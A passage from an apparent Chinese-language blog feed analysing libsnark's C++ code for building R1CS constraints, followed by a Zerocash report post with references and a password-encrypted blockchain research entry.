class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意到参数类型为<code>linear_combination</code>的构造函数，继续跟进相关类：</p><p><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017201752561.png" alt="image-20211017201752561"></p><p><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017205311619.png" alt="image-20211017205311619"></p><p><strong>libsnark/relations/variable.hpp : L144-158</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A linear combination represents a formal expression of the form "sum_i coeff_i * x_&#123;index_i&#125;".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">linear_combination</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; terms;</span><br><span class="line"></span><br><span class="line">    linear_combination() &#123;&#125;;</span><br><span class="line">    linear_combination(<span class="keyword">const</span> <span class="keyword">integer_coeff_t</span> int_coeff);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> FieldT &amp;field_coeff);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> variable&lt;FieldT&gt; &amp;var);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> linear_term&lt;FieldT&gt; &amp;lt);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; &amp;all_terms);</span><br></pre></td></tr></table></figure><p>参数类型为<code>std::vector&lt;linear_term&lt;FieldT&gt; &gt;</code>的构造函数具体实现如下：</p><p><strong>libsnark/relations/variable.tcc : L484-508</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line">linear_combination&lt;FieldT&gt;::linear_combination(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; &amp;all_terms)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (all_terms.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    terms = all_terms;</span><br><span class="line">    <span class="built_in">std</span>::sort(terms.begin(), terms.end(), [](linear_term&lt;FieldT&gt; a, linear_term&lt;FieldT&gt; b) &#123; <span class="keyword">return</span> a.index &lt; b.index; &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> result_it = terms.begin();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = ++terms.begin(); it != terms.end(); ++it)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (it-&gt;index == result_it-&gt;index)</span><br><span class="line">        &#123;</span><br><span class="line">            result_it-&gt;coeff += it-&gt;coeff;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *(++result_it) = *it;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    terms.resize((result_it - terms.begin()) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该构造函数中还做了<code>linear_item::index</code>（变量标识）的合并，表现为coeff相加</p><p>以及其他参数类型的构造函数，比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line">linear_combination&lt;FieldT&gt;::linear_combination(<span class="keyword">const</span> FieldT &amp;field_coeff)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;add_term(linear_term&lt;FieldT&gt;(<span class="number">0</span>, field_coeff));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// r1cs.hpp L108-111👇</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">* The 0-th variable (i.e., "x_&#123;0&#125;") always represents the constant 1.</span></span><br><span class="line"><span class="comment">* Thus, the 0-th variable is not included in num_variables.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>至此我们知道如何去构建一个<code>r1cs_constraint{_system_}</code>的后半部分</p><p><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017211212901.png" alt="image-20211017211212901"></p><hr><p>现在回到前半部分：</p><p>gadgetlib1提供了<code>pb_variable</code>、<code>pb_variable_array</code>、<code>pb_linear_combination</code>和<code>pb_linear_combination_array</code>四个类，是对<code>variable</code>、<code>linear_combination</code>的封装</p><p><strong>libsnark/gadgetlib1/pb_variable.hpp &amp; pb_variable.tcc</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> pb_variable&lt;FieldT&gt;::allocate(protoboard&lt;FieldT&gt; &amp;pb, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;index = pb.allocate_var_index(annotation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allocates pb_variable&lt;FieldT&gt; array in MSB-&gt;LSB order */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> pb_variable_array&lt;FieldT&gt;::allocate(protoboard&lt;FieldT&gt; &amp;pb, <span class="keyword">const</span> <span class="keyword">size_t</span> n, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation_prefix)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation_prefix != <span class="string">""</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    (*<span class="keyword">this</span>).resize(n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        (*<span class="keyword">this</span>)[i].allocate(pb, FMT(annotation_prefix, <span class="string">"_%zu"</span>, i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是<code>pb_variable::allocate</code>👉<code>protoboard::allocate_var_index</code>（即分配输入变量的相关部分）</p><p><strong>libsnark/gadgetlib1/protoboard.hpp : L34 &amp; protoboard.tcc : L37-49</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r1cs_variable_assignment&lt;FieldT&gt; values; <span class="comment">/* values[0] will hold the value of the first allocated variable of the protoboard, *NOT* constant 1 */</span></span><br><span class="line"><span class="comment">// values将存储着r1cs一系列变量的*值*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">var_index_t</span> protoboard&lt;FieldT&gt;::allocate_var_index(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation != <span class="string">""</span>);</span><br><span class="line">    constraint_system.variable_annotations[next_free_var] = annotation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    libff::UNUSED(annotation);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ++constraint_system.auxiliary_input_size;</span><br><span class="line">    values.emplace_back(FieldT::zero());<span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">return</span> next_free_var++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体的gadget实现例子可参考</p><ul><li><a href="https://zhuanlan.zhihu.com/p/46477111" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46477111</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzU5MzMxNTk2Nw==&amp;mid=2247486482&amp;idx=1&amp;sn=407d59e7fc47de0e929c653ce00eb260&amp;chksm=fe131d02c9649414b27a0684ce950b2a63a84ca9c901f81b7251964befd3388e0f616df5bd4b&amp;mpshare=1&amp;scene=23&amp;srcid=1017nCZqhISM0Sl0iPguEI88&amp;sharer_sharetime=1634453102359&amp;sharer_shareid=947c15bf6520d15b99a01837d68f8d7e#rd" target="_blank" rel="noopener">零知识证明 - libsnark源代码分析</a></li><li><a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:cryptofintech:2018:tut1.pdf" target="_blank" rel="noopener">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:cryptofintech:2018:tut1.pdf</a></li></ul><p>libsnark还会用到libff（C++ library for Finite Fields and Elliptic Curves）等库👈e.g. <code>#define FMT libff::FORMAT</code>，在此不加赘述</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Zerocash_Report</title>
      <link href="/2021/05/20/Zerocash-Report/"/>
      <url>/2021/05/20/Zerocash-Report/</url>
      
        <content type="html"><![CDATA[<h3 id="Report"><a href="#Report" class="headerlink" title="Report"></a>Report</h3><div class="row">    <embed src="Zerocash_Report.pdf" width="100%" height="550" type="application/pdf"></div><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="Survey-SNARKs.pdf">Survey-SNARKs.pdf</a></p><p><a href="Zerocash_ Decentralized anonymous payments from bitcoin(extended">Zerocash_ Decentralized anonymous payments from bitcoin(extended).pdf</a>.pdf)</p><p><a href="zkSNARK-explained-III.pdf">zkSNARK-explained-III.pdf</a></p><h3 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h3><p><a href="https://learnblockchain.cn/2019/05/07/qsp-qap/" target="_blank" rel="noopener">零知识证明 - 从QSP到QAP</a></p><p>参考自V神($R1CS\Rightarrow QAP$)</p><p>➡<a href="https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649" target="_blank" rel="noopener">https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649</a></p><p>zcash的处理方式则是直接$Circuit\Rightarrow QAP$</p><p>(二者最后的拉格朗日多项式插值处理部分仍一致)</p><p>可参考</p><ul><li><a href="https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501</a></li><li>zkSNARK-explained-III.pdf (2.5. QAP construction for the circuit in section 2.2.)</li></ul>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Issue Research for Blockchain(Chaitin)</title>
      <link href="/2020/12/26/Issue-Research-for-Blockchain-Chaitin/"/>
      <url>/2020/12/26/Issue-Research-for-Blockchain-Chaitin/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Password required.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e98eadb35e31120ad7a81def5a5ff161ccecdb52242c0745cf906d70a640df6c">5ab08714a2c6ce6a221d23e7b0eacf85644656658ec2ec7ca211478449cab1ef73702a27b916e9f4b253659eee730a9cf3f78bf0d0405a7b40f35a0f3aa4353fe73ffc7872761c2ad0d770884d2b918cf0b9578e8a3565be471d5e9aa3036a5be87c08c50917db2f775b0df92d8ef589e5d5ede9d6804abd80925ddf66d37967ad5c99c0f0510d6bbf5fbab30017ca0dd6a641d263e2dff1d6675a480e7509cde4afca9259ffddecc98732b3d9ac101a91b84e53171db639134982351a2a201c0c9221e363c0339df1a03f720c9d0a3b5276d38f7430fec192ec6524331d27c3797f91c06e9d05a98f68bdd0466cbe5e1b6e9130901701017df972c80121bb5156a75c35032feb37e6168375a94b6b50237812ff00d03beb1e603b264d545c1b3045da054b99db477aac6dfdac551de82e02c66a1c75d1ef70fce16cd4c85b7ec0fbe740b2fb071dc327d3a6e16000295af0d750bfe77b4810963cffd299455b7de9c2985aa698171ebc26ceb51b9d666144594edfa56e182f7ac8bdfe95ce8c7078167f3b349076c9a83379a4288b4bd3af423e20f0a0011498594c712c723210170cc4ab3a241277bf0e8c8cdf663acb738c11bef0852925ab4587ab0a300e225e9da3bfc5a0fd2581d35310deb6be94537fc0afcabe02b1cc512c9e5a66797b5c7efcbf8df4e4ef8a3f16845536ff5dd2c6c358d489e00c3392a4cd923ddbb3db28681e5e9bb8a134f7ab92fd13db62839f2450519ce60aa3276e8f5989cb7af59745ad9116524708f4888d9e14e8cf40139beaf1c695b15cfd1794f29640ada5f28a5a067f97e2b9ba60aac6d0a1da9d746b9c6b355d3efdb7be0a6512f461b7ac8acb1398a8b20656a4e504ef686681c89af8d5edc3ad4b7f6e51c320616df793cba768040b6a42847b4bfa6fe047284c24034bda9accea441283ee0ca58244d19c4f7a397a6dceb49de33c0455d2e5a30d58106a129b4036844b118d79a46ca5fa9e546401f7970768c18734e1d870d86e6566d3969005a5757f8c26543b324bf3ddf24d37c4230c81d4829e1146685b9576bc195ce553108b7e64575e308e05174f10efde4c8f41ca2a0e559b2a043987d37b04eed85bbf318cd309f1dbbb6b8f583b42e9f7a62f5ce0563dbcf590c5135ba9d0aa24c50f12656ffe0716417d21c5043639b8b43ae30a010b24ef747ea26170236286c186a4951f27c968e787400bbbbd162d06448576701f46af6f91d491b450a6b6c0289dad1f9e97843aa5c45fcd702d0cc7dd841c9ba4940776e39e4b3d4af8a772a8bbfd0dca126c08143311e4ce37280effaa78a69c39697ac6e7e895cb08816659805955765b985c63a95fdb10bde00e1505a57ebe989d1a5398e007dc0cf1b0e720af3864caf748e15d5a4e46a78037a6d3c131105732bd2189071264aa9367f2870198f8cc77ce0b86ffd754f860f962d8c34327c454151b2cf41e80453dd5851d43a91da0f1171c8bb80f65d95728cc15b394747f455a78df1ab728af0c5de3d50a3d3bbf16d16ff9daa89c7d249a2a6c8be6b74f8a18a3c37d3e1bde1a3c847b9f3f4e052eff4cba4497adf00cf92176b6c3a193bf83872815dd2b8e9ea7eba4e65a70e122a66eccfd8e0e04f7faf7e2817727fe31696a0c73d3deb2104f88f6f86141ca41eb73f5f2bbebe6f8c11f6c14441f9f145adce3fe775d20cd3228a51387c7d92d498be2e9f3459c530d4aeb38d8fb23936d49249b7bdcf297caa509ec2e5ff4dc673cafdd1a9e8a4b4de5c5fd858cdda61503d9d137afa94412a2e7178dea328531fc33ed4017a93cd55e033baff5590ea1661a0d31f4eae63c234c9669c61371e4d5938409a7b1b198eeb7a4a88f8938c055ce0741e0470479d5d0c65601dd5d7437f15d9d03bfb2925861a9b7e8ae82c5f675812d247adcf6c484dc3725b88c86fa29faa4c03f07ee9c8fccbca6248a751f8675ce225fcae015f71165f56e069bcd76feeba8e43a34ae920d349ef7287cac14a8799e2bad31d29b024cc0bcddc20fe6ab5d711354cf0142a89e2f4cdcf565599f42aec83904e97881b5ad16cf3be700e0e69657cdfd0a466c2bfc826e6a75ab2f0aa3e469c52249e6537217700f2b6d990ecda563b2f1b76f95bfbd7d8461272e037aeadb2de13db1904b3374ccc36536b3f81673d5c1acfbf1b26c1e4f1bb52a96ee178eab28a64a74c23c3f2e1f53c022bdf5749b0bc61981ff0f8c82b20f3e0beab101230f2fe53a2606f600d4256dafa5ad84f7153c70023afae4e8d6794b6aaed4fe828ba14d906442251cc60c1318310424d9bf38e4bc61f09a0a86941688e12ea656e70479035904c2768dedb60cdd967266a087af47c612c77749fa4a5d98972e16eb91c62fa0e5eb339bc74378e2e1c19b17b5252c2b446340c4ee9bb7dea579c91fdd24dd63f30fe07a393da536d9f722c2016e125a924b35e0a2d0147626907cd1dd05b9918c8c38657a89d57c4a3b73249daf86faf3c8d32f3298293a63d65fd0e66d4c3202a5d061816f1fb2b7931cb7e0f6bff5d2f193f9c59a6852813c1c6250fe32612ab5c88026bd7083e111c1f511717eb585921308bf3c0a1d3c31da3aefad3c573d3d19852a966eded0ad9de102a48973310e26db2695cdf06558ee78b6e0f9674388956e9890f533b1991725539197a1dfc693e100b419c7354661b05efb3e7a4debc1b7aafe198e905a43e92dbeb0011d218b4523d1067342d0eae22fc556e1a7fc1d53c06b87d84f9abbdca858cdc04aea528aa46663d61af29cf16bb1d645621b6abb752b9bcb9c4ce7b49d2a96555eba6d85cf701b082ce305967e6a3c9684dc7852ba10cdb0daca39c4255a6c7ee4d9762906e2852830aed39c7875d108e450f1251bdbdb3ded86b6d3c5f9a51e31c3594bb137d113541e7efd3e04c55d6ff6a538c69326713b89bbda7a6a00f2c89f50fb136fec6a4f5af410d55037d067d2d33344bd3ccc246356b51ac2735646aeb655b775db7318d6c21812709d82879237c8d966031ca20d15bdda3c95ea9b272c9027931b4cad2f2e15552f78321b371a80884b8501f29bcc464b49afeebb2b9ec5aeec88256e28770bba54da3b185462979bf64b6fa431674cabe96cfa90832808d722f3e44927f1e7f1436106a07a619b58e61f285829b8726bc14e7d61543a185ee4baf2221d5297d4661478e6397885eebbb31937b25d78e952e9a9fb932e2546f0aa3c07552a52d732a5e6c20e1161d7ec607bee3101d5e81809c7dced5058182a325bd6e654bae5de71332526f0bf343fe75a657a54d9bf6757ee5542c03dff413d86948535fa376689b8ab0468d75408b3a99f31cd4fdd465d503cbfb2ff4fe00a8dbc8bb9bc7128ee8fd65f1624f14d6f983d07590b2f512722f9313679b584b404fdf0c019fa4771ba7081a5d4e985cd0d51e5c4ab01d3d8c1e88052186142c37b7b986a61cab7138a85396cf7068cb550385fb0f4cfa2bf69c2c33791344151a2ec5b0839dd82a3472c245f4450dd124a6bfd0751f67428eb230f0a0ae7a843c5f71accf2c52bdf25192fdd7ce3a325f486a9ada01be82c93d79e917295e65211e000706b7984a77ecac4e9549a2f043fb9322de9ee0000cacd60f5522be4e1cb5aa12190166f0ef96a460841196ae7bb6ba909ec50ca2c0c8df03b77d78db7ace173b3102f8ab2eb1ea6138c1df4c5fd1d48941dea23a8f1f92c1535c12b4d27d5978fe69ed431b69e540919c172d1300827d8c22ea41bded4a44204ebb7d5b9ce3a92522adbcce9b4add1f230cec8c4b13af01f4222741ff1558f264686c75621a192eb4f659b7e585bb58858691d70d2e6fd50df850695176f8c386a8ef3a74a55054a1b179b3cc68d2e05e60e838f26888f965438f0a36fa05059718faced218ffa98d5a605ed52619da6748740ea8673b45a69512a4ddc321c7ff56c74733f442abf5da85ca99f3aed81dce0fc8595f1b3dbde86fd95ff6ed25bd7df57d57ce01f63916d1848180b950fe34d0a401213a6c6e09a5364fc59811ecdfd73571e00e10f9508d70a0b390cf4b975f5083fd55c039c2bafcfae1e6150c4a87a706378e212185c03dc5a6006c343d06198abf6b11105de3b7b3e18c19ca7c3b7acc7266697c72cb147817431e11ea9b7b08d78fe9fbe6c175198ecaf458f9ca633bea926b20451f358af906822646ff6512755d731b9e79840f8d2cb8be5e2f81d25f1f2d89764478beda5a21d6f75d93de4e1cd0f8d5376c0b4ba2b953c2820b0c32bf1b1ae15973d082fab95ba476edf9a4215df52a3f481d41f623d3fbe0656b162a44abc17b11e1d1822d570b87b24622a872eb9cf0c701bfdd9791adeaff92f1bf1ed3ee40caddc32d57f6ed7d2992118fba8d42c05407f3ffd322b4bc164f6a803fb730d5ea966a4936fe444a80e4a08a2084b8cce2a967198d8e5dd98034b7cd0f8d5bb6274711092c34bcbac1c236043f2344cb1e22a8c903eeae4214ecfbdc35a83bef838a7057d1488c8466da3bd0c1abdf92f0ff903bb3086c4e66e32a29657ebdc8380c5523569f904e84b7bd9dd065998b6719c097b93e6e4fff2fc0f551649f181e252ab356e38e9fc168b56a5f2fda2d9f7d56666b270f92e95687adb03984fa80c1b5d3f969a2366094b74132c11e6952274a12f075c08e0d209b7f6594061a650a9341ad6e2edf5ebe8d0e4f965e8a0daeec71a81227e679d3ea631ccbb08f314db560d7e8543f8be34e3555ecb7c39decf87f45c47c260fe8613a4337b594a93ac43aa259f52c9a798ba5d086868f3e4df11fff89c60f847efee4f80ef280b1851ea7163419e13a6b6732d457c0898d5ac111ee1a438c538f72f0224218edad979bc7a4aeaec02dd5470464442e34dcaa38341ddc0e3a9ae8089e093a8d64539566eaf25378bb26347bfac6c3af8ab8f62c4c9805b53ab2aeb324b0883f1b3b5f326db568c60c0c6e680d04c4ac1893c0c5a0746d1f5ad589b81c1ab1308d5166d258db88761557990f56dd8f4239e38b20167b5c45a0ea6cce1c04f28db12ba6b88a9ac16ee77d7632e716458ae27c2e444238b60122796da9a9eaff5d05ee3db6e2468d639cc8e13ade2158cf141f1b8a246e30a07e30147943d822734f7fff139f9df2fd02d0b95de373f8a85944f077ae5328bfc5d7b357eed1eb9f41a0fa435cf343aef1b03ed9ea6c2caf123b7cd845cf344b61266e909d2da3b8d790a27588f235fb875188425cb8c8b1a1d15a706f7ddfa12e2a0f4195c14cdb7adcd04b4a5583a88c1d30a6aac0c90c58f0378ed3f0e0332e062d84ba58dd6eb679b7b11d8fb4786f301e76eaa0c7eda89da0f1c8ee5f4596c3e8b61b24198f661f23661dd8b42e735776c3c744284c7ce4e685267256643cc347b9f59a5ef58b3da7d7161cf08f365ef8ea957fa4e0f0b65bb9fc14cced181e6be6605aa4e339c8757fa6a684d20bebf18fabe3053515a174e1f2e53aa46f5da9d44aba87e85a9709d2d2b5c148a4e399ee83a83bd017f6c8226c2d7d09e14a368c7265554e9a36fafeca7cd692da38dda4b7a9229ee49cbb6edc97fbc7da3c904f8a9ee085bbcf2cdbfa0fc4a80a0da60303441761be8b5d25190a39756ce3eb3585bd8c3c92b091b94fecb310087b6b175abe3b0c3ca51fea9b71c0ba1eb95587748c625f31a32d812ae66bbbc99dd8614704adb0b7d24d1c73c107bdb09b117916333b50366591d93fdd24fb63cc37c0c7ad4be7807f4ad52c3861ec1ab5fc57010114a93e0feadca406c1bf8cee80c368d40cc5ed9c280f6ac22a95875e008fbc4bc3adf866df5cbab977d9dcf72be3bb2d9a6905ea771fab9b7d942c951fe6eb0c9f3c37d91684dfeb5a77f8d86f4f1cc9892458ae8fa1fb58a0f203e023f068346e20a5143b9ffbb636c84c215118e588b840f91adcf03890e6aad556d819a58cacebd7aabd6ec0afcd2bf9bbb0a54bea752015258c60ffaa40f2bf2e7498426e6fb607c73e7c6f91d39c28811c298c7c8b8d10f227e823f60142c7519e31a21b76d127d03b0e60309e43c6b929b1fac202a575c337dac5294140ee1131b5c265e48e773b37d5872b99d958e142a988911a4789a95ccd4fccee1125f5d25c199591277ff77a178689a4318f8f4184574189c176ce49e68f057cd0d8b803b7e087b34260da3f82b551e0fbbfb2678a72be7ace71e12c73a0313dea75846dcaf37391ed8c0266997f4b4e0a76989a4feb9c85199411025a0085e0b75e19ffd8ffe56b40f8bc0c19d3ec89b8dd1267706e1b0a2b7513b5e8f0862c20cf84e04be061ec98d0d9c603a96b461acdd7a87d1330855d3e3f67fcbc879f04ff338ba5404d2412c7d751c34f0d88179372e41ecf125d0f064568c5945397198f79ade642ae0a668077dcb88dc4cf88387b83f595479830dc03d60e9daeb2f97281d2a8ece298b0f87afeacbefe276666e4c97c834724a6cf9934c0a9c687bdc4399a9235db23a17db17896968882a3d3a9438f9f42e7521a06450028380f52d9c8a991cab0c76fabfb95d6cebc84ed2762b13cda0c85d27cf2a706492dd4680a9b1d574cc8fe114164ba15737047b0671933f705b2a066f374b387d7594ea66986db1fa9a4113f7b6f4a1bb5385f7b322754152a6b42c92a81184daaf4e1f01583c55d6e2d9570c83a76012de0bc04c75e50fe94d68d4c719788271ad1ef2e4bfb23e5b2dd5de3451c9055be3beb9bb634d68c1a244d8d8d30f3cef97fb90b0adc0b2f57f6bfe4298710fb30a439d2759deedc7ace2d258de4af5a049713a8c50ddd4591560fef53f21143a6d385dbda6f9940603a53160eabefa7f0f540d0c04754a2edc6339abe9c98a13db6a686ae1c314e513805aa6cb5fdf3067f8f9dae88c7a5894ba7f74aa06cc0aca6c35bf51b0246caf6bcd3ce883b8ca72e58e1da49e58b64fe9e22a2ec5bf73b4a5f2d4cf85af0f7a37288202bd0de0c729de74bac247aff293f9551b50a94f153f4558a8b1f1e0966fd0a6d842b17ac813c15b565979226344405c57028be741841e67cb4f630162061a0e96feedb0114b14c6a0fe134de0fa97a97a7fe63423b0dcc266b094d9d059925ece9353cb1d2c6b2cde32d64dac9d2dd92cb5b78de5e12e9f0aaa470e6c43ee4d53f847a6cdc74a0a921c48e2db8d89afded5a835f479cdf4ea30705c4936a56d869f28445e7ddede239ad837776ff9535ad2a76bc1140082df6f5f6d0eab9cdde812fc26a2839a44d716c9a1f7258388bfffc1fb038cc30909c0093ad2728aa4d0e71c1f01ed2388ed4401489bc3118fd8300e729320c451b8678118aee888319b6e14236e1e5b17e8f62cb8e98d387edbbad63372f0bffb8dd8810bcc6bc21bfb27c4ec833e1994d5260c4661d3e70450e80665a2cf6bcdaa0199789f4fdc4696e36b7b04255b9c8ef25cea036424446768b1db35f00cc54bf459c8ea9df7bd8dd6d8253fc3390295a38b1b0dae6f5adcd3f293a13b8674e0b052792218638e37a4ab9229cb28fcf32d5f90a27e411565c67b083baa07262999492c7ab04a80446b6bd4d0a91daf308f5679284e382ddcf357e090de5455a792d2fbe59c1e8e44756d9424410cc83c9874b22e087ed086022f749c5273d6909be52249feaa50a91a59fdaf17b62606f22eee892bba622aadfd3cb844432292327e40b287c567da435f56bff5453df0557f7d6cbfd947bfad9f216aa461690dc1915689e088072d6fa3df794cac0e1055decc44f3f7c3356418f20f22daf9060c66bb4b96122431ccee7ef7d4fcccbe26464c8f8a1f8560daa0b8fa68e47c3a8c64fefcfd5fa030b9031ff3f1c0354b16a76e86ef30eae4f5c00761afb48c526dde232e9ad94277dcc4b16a7f289941ab1b24dcd5edadd74f07e6a6af404e8392b0f860dae5aca92e42e1b90f63406087c86eb6b6d4ce7fbb0bd5262850be48306cbf06e81e1fbc73c942a02fb2a2c93bf9a5b155534a0ada440c93757d925708e5bdc9aaa2515fd9dbfc05f52cb492312885ed1932d3f6f4655107538539e735244ca9a281ac9620768372e33fb9c7bf973c7f2c9835cc18eb8dacd6b8ac4d61f7eb3630f62aa8be61d3a9049bdc85a98aeb949eb4e4447bc0bf37588f9254a1e4a9853273074a58800704846d2093021ff420d720135fe65cea8f3cf7b29d9af66630337102f7d8ae14d4dcdc9e4051f4c99678530f2264b56e8935909df00aaff8fb7a65668667e8f1d4a8754cc746c2012010f607ae811c8ecb749d0e03a7f8e0069b8116df160963c94bb9b268ca4f641eb3bf91b770539db8d4fd540537f273945ce91a4e79fbd80205a719e2c78baf2c6a1a00a8bc9aa3ae97aa5fdd51e0ba5c02e7b0ef069c6d554c676e74d85e6a87f3a3259fc66d3a69d3cc36d55658913a2f7ae27ff891fd3e1700964769a0b8c911f51775dff7eeb9743b6c55db1d43f50c08dea28b23e87bc2fcc358e70eddcad8a41683473cbc